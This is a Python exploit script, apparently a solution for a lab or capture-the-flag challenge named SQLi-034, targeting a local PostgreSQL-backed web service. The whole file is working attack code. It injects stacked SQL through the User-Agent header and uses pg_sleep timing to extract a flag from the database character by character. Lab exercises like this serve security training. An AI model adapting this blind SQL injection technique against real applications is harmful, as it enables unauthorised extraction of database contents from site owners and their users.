#!/usr/bin/env python3
"""SQLi-034: PostgreSQL User-Agent Time-based Exploit"""
import requests
import time
import string

URL = "http://localhost:5034/"
DELAY = 3
THRESHOLD = 2.5

def check(condition):
    """Check if condition is true using time-based SQLi"""
    start = time.time()
    # Injection in User-Agent (INSERT context - close both parameters)
    ua_value = f"x', '0.0.0.0'); SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) END-- "
    try:
        requests.get(URL, headers={"User-Agent": ua_value}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=50):
    """Extract string value character by character"""
    result = ""
    charset = string.ascii_letters + string.digits + "_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: Testing '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

if __name__ == "__main__":
    print("="*60)
    print("SQLi-034: PostgreSQL User-Agent Time-based Exploit")
    print("="*60)
    
    # Extract flag
    print("\n[*] Extracting flag from 'flags' table...")
    flag_query = "SELECT value FROM flags WHERE name='sqli_034'"
    flag = extract_string(flag_query, max_len=40)
    
    print(f"\n{'='*60}")
    print(f"ðŸŽ‰ FLAG: {flag}")
    print(f"{'='*60}")
